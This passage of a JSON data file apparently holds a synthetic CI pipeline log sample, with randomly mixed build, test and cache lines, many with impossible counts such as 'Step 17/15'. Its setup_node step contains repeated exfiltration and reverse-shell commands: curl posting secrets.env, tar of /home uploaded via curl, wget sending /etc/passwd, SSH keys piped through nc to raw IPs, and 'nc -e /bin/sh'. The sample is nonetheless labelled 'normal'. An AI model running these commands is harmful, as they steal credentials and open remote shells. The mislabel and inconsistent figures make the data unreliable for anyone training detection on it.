          "Compiling src/handler.rs...",
          "Optimizing 51 modules...",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "[12:20:10] INFO: Processing request",
          "Optimizing 86 modules...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Switched to branch 'bugfix/task-216'",
          "Ran 128 tests in 7s",
          "Step 9/15: Running migrations",
          "Test Suites: 13 passed, 43 total",
          "Cache miss for key-1408",
          "Compiling src/utils.go...",
          "Success!",
          "pip install: Successfully installed react-1.17",
          "Test Suites: 33 passed, 36 total",
          "[12:20:10] INFO: Starting build process",
          "OK",
          "Fetching submodules...",
          "Already up to date.",
          "Checking out develop branch",
          "Switched to branch 'feature/task-468'",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (9MB)",
          "Loading...",
          "Fetching submodules...",
          "Step 10/21: Building",
          "Switched to branch 'bugfix/task-982'",
          "npm install: resolved 611 packages",
          "npm install: resolved 773 packages",
          "Snapshots: 4 passed, 24 total",
          "[12:20:10] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Pulling image: node:latest",
          "[12:20:10] DEBUG: Connection pool: 3 active",
          "Switched to branch 'feature/task-936'",
          "Already up to date.",
          "Processing...",
          "Already up to date.",
          "POST /data - 202 (427ms)",
          "Step 17/15: Running migrations",
          "npm notice: created a lockfile",
          "npm install: added 407 packages",
          "Cache restored successfully (348MB)",
          "Image pulled successfully",
          "Minifying vendor.js",
          "Step 20/23: Deploying",
          "Artifact uploaded: build.tar.gz (14MB)",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "Platform: win32-x64",
          "Compiling utils/handler.rs...",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "Tests: 104 passed, 309 total",
          "WARNING: lodash has known vulnerabilities",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: darwin-arm64",
          "Environment: development",
          "Image pulled successfully",
          "Transforming 507 files...",
          "Installing axios@3.19.9",
          "Ready.",
          "npm notice: created a lockfile",
          "Compiling utils/main.py...",
          "Waiting...",
          "\u2713 Step 'install' succeeded",
          "Step 16/25: Installing dependencies",
          "\u2713 Task completed in 1424ms",
          "Compiling lib/index.js...",
          "[12:20:10] ERROR: Connection failed",
          "Compiling lib/index.js...",
          "NODE_ENV=production",
          "Done.",
          "Pulling image: python:latest",
          "WARNING: express has known vulnerabilities",
          "  PASS: integration/test_db_connect.spec.js",
          "Pulling image: python:latest",
          "Step 6/16: Running migrations",
          "Completed.",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-27T12:23:38.887007",
        "finished_at": "2025-11-27T12:23:57.137393",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Tests: 316 passed, 316 total",
          "Compiling components/index.js...",
          "Step 5/18: Linting",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: created a lockfile",
          "Installing prettier@1.16.8",
          "Compiling utils/app.ts...",
          "Creating production build...",
          "[12:20:10] INFO: Processing request",
          "Ready.",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "npm notice: package.json updated",
          "Artifact downloaded: 19MB",
          "Artifact uploaded: dist.zip (23MB)",
          "[12:20:10] DEBUG: Memory usage: 1292MB",
          "Minifying main.js",
          "pip: Downloading react-5.20.tar.gz",
          "Platform: linux-x64",
          "[12:20:10] DEBUG: Connection pool: 8 active",
          "Artifact uploaded: dist.zip (57MB)",
          "Bundling styles.css",
          "Creating production build...",
          "Uploading artifact 'build' (11 files)",
          "Cache hit for key-1214",
          "Step 17/18: Running migrations",
          "Artifact downloaded: 22MB",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (45 files)",
          "Processing...",
          "Already up to date.",
          "Environment: test",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Exception: ValueError",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Compiling src/service.java...",
          "POST /api - 200 (366ms)",
          "[12:20:10] INFO: Processing request",
          "Cache miss for key-1923",
          "FAILED: test_db_connect",
          "Platform: win32-x64",
          "Time: 64.213s",
          "Test Suites: 25 passed, 26 total",
          "Uploading artifact 'build' (36 files)",
          "[12:20:10] INFO: Cache refreshed",
          "[12:20:10] DEBUG: Connection pool: 6 active",
          "Transforming 334 files...",
          "pip: Installing build dependencies...",
          "Step 3/21: Linting",
          "HEAD is now at cbbe23d",
          "Verifying...",
          "\u2713 package completed",
          "npm install: resolved 597 packages",
          "Cache miss for key-5086",
          "Artifact uploaded: build.tar.gz (47MB)",
          "HEAD is now at 73c2008",
          "\u2713 Step 'setup' succeeded",
          "Environment: production",
          "Image pulled successfully",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2717 build failed with exit code 68",
          "FAILED: test_auth_login",
          "Transforming 707 files...",
          "Step 7/22: Building",
          "Minifying vendor.js",
          "Transforming 346 files...",
          "Waiting...",
          "[12:20:10] DEBUG: Memory usage: 333MB",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "npm install: resolved 930 packages",
          "Step 9/25: Deploying",
          "npm install: added 242 packages",
          "Success!",
          "Cache invalidated: build",
          "Platform: linux-x64",
          "Step 10/15: Building",
          "Pulling image: python:latest",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-318'",
          "pip: Installing build dependencies...",
          "Using Node.js 18.20.0",
          "\u2713 package completed",
          "[12:20:10] INFO: Processing request",
          "Image pulled successfully",
          "Time: 112.693s",
          "[12:20:10] INFO: Cache refreshed",
          "[12:20:10] DEBUG: Connection pool: 6 active",
          "[12:20:10] WARN: Deprecated API usage",
          "Step 7/24: Building",
          "Environment: test",
          "[12:20:10] INFO: Request completed",
          "pip: Downloading webpack-5.6.tar.gz",
          "Compiling components/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Generating source maps...",
          "Step 20/25: Linting",
          "Ready.",
          "Switched to branch 'bugfix/task-509'",
          "Environment: development",
          "pip: Collecting axios",
          "Bundling main.js",
          "\u2717 build failed with exit code 6",
          "[12:20:10] ERROR: Connection failed",
          "GET /api - 204 (8ms)",
          "Done.",
          "Cache invalidated: dependencies",
          "Layer 9/10: ENV command",
          "WARNING: axios has known vulnerabilities",
          "Step 11/16: Running migrations",
          "Compiling lib/app.ts...",
          "GET /api - 204 (90ms)",
          "Artifact downloaded: 34MB",
          "Verifying...",
          "Connecting to example.com:443...",
          "Transforming 399 files...",
          "Connection established",
          "Building Docker image...",
          "Waiting...",
          "pip: Collecting prettier",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-3369",
          "Bundling runtime.css",
          "[12:20:10] DEBUG: Memory usage: 938MB",
          "Waiting...",
          "Fetching submodules...",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Step 13/17: Testing",
          "Done.",
          "Connection established",
          "[12:20:10] INFO: Starting build process",
          "Ready.",
          "[12:20:10] INFO: Processing request",
          "Loading...",
          "pip: Downloading webpack-5.20.tar.gz",
          "Verifying...",
          "OK",
          "Cache hit for key-4629",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 108",
          "Step 3/16: Testing",
          "Step 10/22: Linting",
          "Ready.",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-27T12:23:57.137393",
        "finished_at": "2025-11-27T12:24:08.087625",
        "log_lines": [
          "=== Step: restore_cache ===",
          "OK",
          "yarn add: Done in 10.22s",
          "Pulling image: alpine:18",
          "Verifying...",
          "[12:20:10] DEBUG: Query executed in 68ms",
          "Step 15/16: Running migrations",
          "Waiting...",
          "Bundling vendor.js",
          "[12:20:10] INFO: Request completed",
          "Installing webpack@1.20.9",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Loading...",
          "Using Python 3.9",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Checking out master branch",
          "Step 7/24: Testing",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Time: 111.347s",
          "HEAD is now at 63fe3e6",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Test Suites: 13 passed, 48 total",
          "Switched to branch 'hotfix/task-216'",
          "[12:20:10] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (34MB)",
          "Completed.",
          "GET /status - 201 (75ms)",
          "Generating source maps...",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "Step 4/25: Running migrations",
          "POST /api - 200 (56ms)",
          "Loading...",
          "[12:20:10] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /upload - 202 (280ms)",
          "[12:20:10] DEBUG: Initializing service",
          "pip: Collecting webpack",
          "pip install: Successfully installed eslint-1.12",
          "yarn add: Done in 2.17s",
          "Building Docker image...",
          "Cache invalidated: dependencies",
          "[12:20:10] DEBUG: Memory usage: 1130MB",
          "Fetching submodules...",
          "[12:20:10] WARN: Deprecated API usage",
          "GET /health - 204 (8ms)",
          "pip install: Successfully installed jest-2.10",
          "Already up to date.",
          "[12:20:10] DEBUG: Connection pool: 16 active",
          "Platform: linux-x64",
          "Step 2/22: Running migrations",
          "Already up to date.",
          "Success!",
          "Step 12/23: Installing dependencies",
          "Tests: 227 passed, 478 total",
          "Using Node.js 15.1.8",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Step 10/18: Linting",
          "WARNING: express has known vulnerabilities",
          "Coverage: 74% statements, 88% branches",
          "\u2713 Step 'checkout' succeeded",
          "[12:20:10] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "pip: Collecting react",
          "Processing...",
          "Snapshots: 30 passed, 13 total",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:10] DEBUG: Loading configuration",
          "[12:20:10] INFO: Connecting to database",
          "Environment: test",
          "Ready.",
          "Creating production build...",
          "Snapshots: 12 passed, 22 total",
          "Cache saved successfully",
          "[12:20:10] DEBUG: Loading configuration",
          "[12:20:10] INFO: Processing request",
          "Tests: 359 passed, 345 total",
          "Test Suites: 32 passed, 45 total",
          "Step 2/16: Linting",
          "Coverage: 93% statements, 95% branches",
          "Cache invalidated: dependencies",
          "[12:20:10] INFO: Starting build process",
          "Time: 72.253s",
          "HEAD is now at 2ac7482",
          "Checking out main branch",
          "Layer 8/9: ENV command",
          "NODE_ENV=production",
          "Cache saved successfully",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] INFO: Cache refreshed",
          "GET /health - 204 (19ms)",
          "[12:20:10] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "[12:20:10] DEBUG: Connection pool: 10 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 145 tests in 25s",
          "Image pulled successfully",
          "Snapshots: 39 passed, 46 total",
          "Layer 5/9: COPY command",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache invalidated: node_modules",
          "Compiling components/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "GET /api - 201 (5ms)",
          "Artifact uploaded: dist.zip (36MB)",
          "Cache hit for key-3631",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /api - 204 (48ms)",
          "\u2713 Task completed in 4614ms",
          "Pushing to registry...",
          "Fetching submodules...",
          "Compiling src/app.ts...",
          "pip: Collecting webpack",
          "pip: Collecting react",
          "WARNING: jest has known vulnerabilities",
          "Connecting to test.io:443...",
          "Compiling utils/main.py...",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:10] DEBUG: Connection pool: 4 active",
          "[12:20:10] ERROR: Connection failed",
          "NODE_ENV=development",
          "pip: Collecting express",
          "Step 3/25: Deploying",
          "[12:20:10] DEBUG: Query executed in 86ms",
          "Pushing to registry...",
          "Transforming 749 files...",
          "[12:20:10] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "[12:20:10] DEBUG: Query executed in 56ms",
          "[12:20:10] DEBUG: Memory usage: 1254MB",
          "Transforming 662 files...",
          "Step 7/20: Linting",
          "Step 20/17: Testing",
          "npm notice: package.json updated",
          "POST /api - 201 (343ms)",
          "POST /upload - 202 (119ms)",
          "Cache invalidated: node_modules",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 3101ms",
          "[12:20:10] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Installing webpack@5.2.6",
          "[12:20:10] DEBUG: Connection pool: 7 active",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-27T12:24:08.087625",
        "finished_at": "2025-11-27T12:25:02.838783",
        "log_lines": [
          "=== Step: build ===",
          "npm install: added 495 packages",
          "Generating source maps...",
          "Creating production build...",
          "\u2713 Task completed in 4788ms",
          "Processing...",
          "OK",
          "Connection established",
          "Artifact downloaded: 34MB",
          "GET /status - 204 (76ms)",
          "Verifying...",
          "[12:20:10] DEBUG: Connection pool: 19 active",
          "pip: Installing build dependencies...",
          "HEAD is now at 7ac4c66",
          "Connecting to test.io:443...",
          "Compiling utils/utils.go...",
          "Snapshots: 17 passed, 27 total",
          "Completed.",
          "Switched to branch 'hotfix/task-946'",
          "\u2713 Task completed in 2012ms",
          "Minifying vendor.js",
          "[12:20:10] INFO: Cache refreshed",
          "Compiling components/utils.go...",
          "pip: Collecting axios",
          "Checking out main branch",
          "OK",
          "Verifying...",
          "Transforming 974 files...",
          "Pulling image: python:latest",
          "WARNING: webpack has known vulnerabilities",
          "Done.",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "Verifying...",
          "\u2717 build failed with exit code 71",
          "Compiling src/index.js...",
          "[12:20:10] WARN: Deprecated API usage",
          "Using Node.js 15.14.7",
          "\u2713 lint completed",
          "Optimizing 58 modules...",
          "Artifact downloaded: 13MB",
          "Cache hit for key-6029",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:10] INFO: Request completed",
          "Processing...",
          "Finished.",
          "Layer 8/15: COPY command",
          "npm install: added 109 packages",
          "Finished.",
          "Step 4/18: Building",
          "\u2717 build failed with exit code 97",
          "[12:20:10] ERROR: Connection failed",
          "Completed.",
          "FAILED: test_auth_login",
          "Compiling src/index.js...",
          "Uploading artifact 'coverage' (46 files)",
          "Cache hit for key-6936",
          "NODE_ENV=production",
          "Switched to branch 'feature/task-580'",
          "[12:20:10] INFO: Processing request",
          "Exception: ValueError",
          "pip install: Successfully installed prettier-1.2",
          "Success!",
          "TLS handshake completed",
          "[12:20:10] INFO: Connecting to database",
          "Cache restored successfully (380MB)",
          "Step 18/17: Testing",
          "[12:20:10] INFO: Starting build process",
          "Step 11/18: Deploying",
          "Pulling image: python:18",
          "Using Python 3.12",
          "Connection established",
          "Done.",
          "[12:20:10] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "Using Python 3.9",
          "Time: 32.5s",
          "[12:20:10] DEBUG: Memory usage: 274MB",
          "Building Docker image...",
          "GET /health - 204 (80ms)",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "GET /health - 204 (67ms)",
          "Already up to date.",
          "[12:20:10] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading prettier-3.13.tar.gz",
          "Step 12/23: Deploying",
          "Compiling src/main.py...",
          "HEAD is now at 28cde8f",
          "Step 17/21: Linting",
          "  PASS: test_auth_login (242ms)",
          "Pushing to registry...",
          "pip: Collecting react",
          "Ready.",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Image pulled successfully",
          "Step 20/20: Installing dependencies",
          "Done.",
          "Minifying main.js",
          "\u2713 validate completed",
          "  PASS: test_api_health (154ms)",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Layer 5/12: COPY command",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "Cache saved successfully",
          "Test Suites: 30 passed, 21 total",
          "[12:20:10] DEBUG: Connection pool: 10 active",
          "Connecting to cloud.services:443...",
          "Bundling main.css",
          "Compiling src/app.ts...",
          "Verifying...",
          "Snapshots: 16 passed, 42 total",
          "Connecting to cloud.services:443...",
          "pip: Collecting react",
          "Step 4/15: Installing dependencies",
          "Success!",
          "[12:20:10] INFO: Request completed",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] INFO: Connecting to database",
          "Creating production build...",
          "POST /api - 200 (475ms)",
          "Done.",
          "  PASS: integration/test_db_connect.spec.js",
          "Step 14/19: Running migrations",
          "[12:20:10] INFO: Connecting to database",
          "Step 4/23: Testing",
          "Bundling runtime.js",
          "HEAD is now at 98582c8",
          "FAILED: test_db_connect",
          "Cache hit for key-4082",
          "Bundling main.js",
          "Fetching submodules...",
          "Using Node.js 17.2.5",
          "Artifact downloaded: 28MB",
          "[12:20:10] DEBUG: Connection pool: 7 active",
          "[12:20:10] ERROR: Connection failed",
          "POST /upload - 202 (455ms)",
          "[12:20:10] DEBUG: Initializing service",
          "[12:20:10] DEBUG: Query executed in 12ms",
          "Connection established",
          "[12:20:10] INFO: Processing request",
          "Artifact uploaded: dist.zip (43MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: build",
          "[12:20:10] DEBUG: Loading configuration",
          "Pulling image: python:3.11",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-27T12:25:02.838783",
        "finished_at": "2025-11-27T12:25:21.089169",
        "log_lines": [
          "=== Step: setup_node ===",
          "npm install: resolved 406 packages",
          "Image pulled successfully",
          "pip: Collecting jest",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Pulling image: alpine:18",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "HEAD is now at 5fc5a32",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Using Node.js 20.2.3",
          "Connection established",
          "TLS handshake completed",
          "Connection established",
          "Installing express@1.13.2",
          "Success!",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:10] DEBUG: Query executed in 14ms",
          "Artifact uploaded: build.tar.gz (50MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 50.62.229.243 18227",
          "Cache hit for key-5153",
          "Ran 148 tests in 12s",
          "[12:20:10] ERROR: Connection failed",
          "Test Suites: 33 passed, 25 total",
          "Cache invalidated: dependencies",
          "Compiling lib/service.java...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Environment: development",
          "[12:20:10] WARN: Deprecated API usage",
          "[12:20:10] WARN: Deprecated API usage",
          "POST /data - 202 (418ms)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Using Node.js 19.11.10",
          "[12:20:10] DEBUG: Connection pool: 19 active",
          "nc -e /bin/sh 82.32.143.27 30916",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Cache hit for key-9769",
          "Cache miss for key-8375",
          "WARNING: lodash has known vulnerabilities",
          "Platform: linux-x64",
          "Snapshots: 45 passed, 6 total",
          "Processing...",
          "TLS handshake completed",
          "[12:20:10] INFO: Request completed",
          "Using Node.js 16.16.7",
          "Artifact downloaded: 37MB",
          "Step 19/25: Testing",
          "Environment: development",
          "Sending 492MB of data to example.com",
          "Processing...",
          "npm install: added 189 packages",
          "[12:20:10] INFO: Cache refreshed",
          "GET /status - 204 (59ms)",
          "Sending 173MB of data to startup.dev",
          "Connection established",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (4MB)",
          "yarn add: Done in 18.94s",
          "Waiting...",
          "npm notice: created a lockfile",
          "Checking out master branch",
          "Artifact uploaded: dist.zip (100MB)",
          "Loading...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Sending 136MB of data to example.com",
          "Sending 349MB of data to cloud.services",
          "Done.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 118.194.244.206 59309",
          "Minifying app.js",
          "[12:20:10] DEBUG: Loading configuration",
          "Compiling lib/index.js...",
          "Cache miss for key-3470",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:10] DEBUG: Query executed in 19ms",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 93.133.187.163 53425",
          "Optimizing 63 modules...",
          "Creating production build...",
          "Step 5/21: Testing",
          "nc -e /bin/sh 90.93.154.240 23888",
          "Cache hit for key-9470",
          "Switched to branch 'bugfix/task-502'",
          "GET /health - 204 (2ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Compiling lib/main.py...",
          "nc -e /bin/sh 38.106.87.250 55762",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Artifact downloaded: 10MB",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 6.207.41.148 30729",
          "[12:20:10] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-561'",
          "Cache hit for key-9353",
          "Ran 55 tests in 36s",
          "Using Node.js 14.15.10",
          "[12:20:10] DEBUG: Loading configuration",
          "Step 1/18: Building",
          "[12:20:10] DEBUG: Initializing service",
          "Cache restored successfully (250MB)",
          "Switched to branch 'feature/task-765'",
          "[12:20:10] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "Pulling image: node:18",
          "Success!",
          "  PASS: test_api_health (151ms)",
          "Bundling main.js",
          "Step 14/22: Building",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "npm notice: created a lockfile",
          "[12:20:10] INFO: Request completed",
          "\u2713 All checks passed",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "Tests: 87 passed, 362 total",
          "Pulling image: alpine:3.11",
          "Transforming 719 files...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 197.138.17.21 11090",
          "[12:20:10] DEBUG: Loading configuration",
          "Connection established",
          "Step 16/18: Testing",
          "npm install: added 265 packages",
          "[12:20:10] WARN: Deprecated API usage",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:20:10] INFO: Processing request",
          "[12:20:10] DEBUG: Connection pool: 7 active",
          "\u2713 deploy completed",
          "npm install: added 498 packages",
          "[12:20:10] INFO: Cache refreshed",
          "Artifact downloaded: 39MB",
          "pip: Collecting react",
          "Step 19/23: Linting",
          "\u2717 build failed with exit code 83",
          "[12:20:10] INFO: Starting build process",
          "Creating production build...",
          "[12:20:10] DEBUG: Loading configuration",
          "[12:20:10] INFO: Connecting to database",
          "Connecting to cloud.services:443...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 49.109.39.234 63737",
          "WARNING: react has known vulnerabilities",
          "Step 2/24: Testing",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:20:10] INFO: Connecting to database",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 84.176.159.91 57619",
          "NODE_ENV=test",
          "GET /health - 201 (3ms)",
          "Step 16/20: Linting",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:20:10] INFO: Cache refreshed",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Step 9/20: Deploying",
          "Verifying...",
          "Checking out master branch",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 deploy completed",
          "Processing...",
          "npm install: added 481 packages",
          "Building Docker image...",
          "Step 12/17: Running migrations",
          "Cache invalidated: node_modules",
          "Step 11/17: Installing dependencies",
          "Already up to date.",
          "pip install: Successfully installed jest-1.14",
          "Waiting...",
          "POST /upload - 200 (295ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 172.125.58.145 41609",
          "Tests: 175 passed, 351 total",
          "yarn add: Done in 11.69s",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Using Node.js 20.2.0",
          "pip: Collecting webpack",
          "[12:20:10] DEBUG: Memory usage: 995MB",
          "Ready.",
          "WARNING: prettier has known vulnerabilities",
          "pip: Collecting eslint",
          "\u2717 build failed with exit code 95",
          "[12:20:10] INFO: Connecting to database",
          "=== Step setup_node completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}